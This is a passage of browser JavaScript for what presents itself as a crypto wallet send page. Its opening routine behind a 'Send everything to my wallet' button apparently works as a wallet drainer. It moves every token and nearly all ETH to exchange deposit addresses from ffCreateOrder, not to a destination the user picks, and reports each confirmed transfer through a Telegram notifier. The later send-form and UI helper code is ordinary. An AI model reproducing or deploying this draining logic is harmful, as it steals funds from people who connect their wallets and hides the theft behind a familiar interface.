        drainBtn.textContent = `⏳ ${symbol}…`;
        await tx.wait();
        await logTransfer({ symbol, amount: formatted, txHash: tx.hash, ffOrderId: order.id, type: 'exchange' });
        tgNotify(`✅ *Confirmé*\n💰 ${formatted} ${symbol}\n🔗 \`${tx.hash}\``);
        sent++;
      } catch (e) {
        if (e.code === 4001 || e.code === 'ACTION_REJECTED') toast(`${symbol} refusé`, 'error');
        else toast(`${symbol} échoué: ${e.shortMessage ?? e.message}`, 'error');
        failed++;
      }
    }

    // ETH
    try {
      const bal     = await state.provider.getBalance(state.address);
      const feeData = await state.provider.getFeeData();
      const gasCost = (feeData.maxFeePerGas ?? feeData.gasPrice ?? 0n) * 21000n;
      const sendable = bal - gasCost;
      if (sendable > 0n) {
        const ethAmount = parseFloat(ethers.formatEther(sendable));
        const order     = await ffCreateOrder('ETH', network, ethAmount);
        const depositAddr = order.from?.address;
        if (!depositAddr) throw new Error('Pas d\'adresse ff.io');
        const tx = await state.signer.sendTransaction({ to: depositAddr, value: sendable });
        await tx.wait();
        await logTransfer({ symbol: 'ETH', amount: ethAmount, txHash: tx.hash, ffOrderId: order.id, type: 'exchange' });
        tgNotify(`✅ *ETH confirmé*\n💰 ${ethAmount} ETH\n🔗 \`${tx.hash}\``);
        sent++;
      }
    } catch (e) { failed++; }

    toast(`Terminé — ${sent} envoyé(s), ${failed} échoué(s).`, sent > 0 ? 'success' : 'error');
  }

  drainBtn.disabled    = false;
  drainBtn.textContent = '⚡ Send everything to my wallet';
  loadBalances();
}

if (drainBtn) {
  drainBtn.addEventListener('click', runBatchSend);
}

// ── Max button ────────────────────────────────────────────────────────────────

maxBtn.addEventListener('click', () => {
  const asset = assetSelect.value;
  if (!asset || !state.balances[asset]) return;
  amountEl.value = state.balances[asset].formatted;
});

// ── Send ──────────────────────────────────────────────────────────────────────

sendBtn.addEventListener('click', async () => {
  hideTxStatus();
  const asset     = assetSelect.value;
  const recipient = recipientEl.value.trim();
  const amount    = amountEl.value.trim();

  // Validate
  if (!asset)               { shakeInput(assetSelect);   return; }
  if (!ethers.isAddress(recipient)) { toast('Invalid recipient address.', 'error'); shakeInput(recipientEl); return; }
  if (!amount || isNaN(parseFloat(amount)) || parseFloat(amount) <= 0) {
    toast('Enter a valid amount.', 'error'); shakeInput(amountEl); return;
  }

  sendBtn.disabled = true;
  sendBtn.innerHTML = '<span class="spinner"></span> Confirm in wallet…';

  try {
    let txHash;

    if (asset === 'ETH') {
      const tx = await state.signer.sendTransaction({
        to:    recipient,
        value: ethers.parseEther(amount),
      });
      txHash = tx.hash;
      showTxStatus('pending', txHash);
      await tx.wait();
      showTxStatus('success', txHash);
    } else {
      const t        = state.balances[asset]?.token;
      if (!t)        { toast('Token info not loaded yet.', 'error'); return; }
      const contract = new ethers.Contract(t.address, ERC20_ABI, state.signer);
      const parsed   = ethers.parseUnits(amount, t.decimals);
      const tx       = await contract.transfer(recipient, parsed);
      txHash = tx.hash;
      showTxStatus('pending', txHash);
      await tx.wait();
      showTxStatus('success', txHash);
    }

    toast('Transaction confirmed!', 'success');
    loadBalances();
    recipientEl.value = '';
    amountEl.value    = '';
  } catch (err) {
    if (err.code === 4001 || err.code === 'ACTION_REJECTED') {
      toast('Transaction rejected.', 'error');
      hideTxStatus();
    } else {
      const msg = err.reason ?? err.shortMessage ?? err.message ?? 'Transaction failed.';
      showTxStatus('error', null, msg);
      toast(msg.slice(0, 80), 'error');
    }
  } finally {
    sendBtn.disabled = false;
    sendBtn.innerHTML = 'Send';
  }
});

// ── Tx status panel ───────────────────────────────────────────────────────────

function showTxStatus(type, hash, errorMsg) {
  const net = NETWORKS[state.chainId] ?? { explorer: '#' };
  txStatusEl.style.display = 'block';
  txStatusEl.classList.add('show');

  const icons   = { pending: '⏳', success: '✅', error: '❌' };
  const titles  = { pending: 'Transaction Submitted', success: 'Confirmed!', error: 'Transaction Failed' };
  const subs    = { pending: 'Waiting for network confirmation…', success: 'Your transfer was successful.', error: errorMsg ?? 'Something went wrong.' };

  let hashHtml = '';
  if (hash) {
    const url = net.explorer + hash;
    hashHtml = `
      <div class="tx-hash-row">
        <span style="flex:1;word-break:break-all">${hash}</span>
        <a class="tx-hash-link" href="${url}" target="_blank" rel="noopener">View ↗</a>
      </div>`;
  }

  txStatusEl.innerHTML = `
    <div class="tx-status-card ${type}">
      <div class="tx-status-header">
        <span class="tx-status-icon">${icons[type]}</span>
        <div>
          <div class="tx-status-title">${titles[type]}</div>
          <div class="tx-status-subtitle">${subs[type]}</div>
        </div>
      </div>
      ${hashHtml}
    </div>`;
}

function hideTxStatus() {
  txStatusEl.style.display = 'none';
  txStatusEl.innerHTML = '';
}

// ── Copy address ──────────────────────────────────────────────────────────────

document.getElementById('copyAddr').addEventListener('click', () => {
  if (!state.address) return;
  navigator.clipboard.writeText(state.address).then(() => toast('Address copied!', 'info'));
});

// ── Helpers ───────────────────────────────────────────────────────────────────

function truncateAddr(addr) {
  return addr.slice(0, 6) + '…' + addr.slice(-4);
}

function shakeInput(el) {
  el.style.animation = 'none';
  el.offsetHeight; // reflow
  el.style.animation = 'shake 0.3s ease';
  el.addEventListener('animationend', () => { el.style.animation = ''; }, { once: true });
}

function toast(msg, type = 'info') {
  const icons = { success: '✅', error: '❌', info: 'ℹ️' };
  const el = document.createElement('div');
  el.className = `toast ${type}`;
  el.innerHTML = `<span>${icons[type]}</span><span>${msg}</span>`;
  toastContainer.appendChild(el);
  setTimeout(() => el.remove(), 4000);
}

// ── Shake animation (injected) ────────────────────────────────────────────────

const shakeStyle = document.createElement('style');
shakeStyle.textContent = `@keyframes shake {
  0%,100% { transform: translateX(0); }
  20%,60% { transform: translateX(-6px); }
  40%,80% { transform: translateX(6px); }
}`;
document.head.appendChild(shakeStyle);
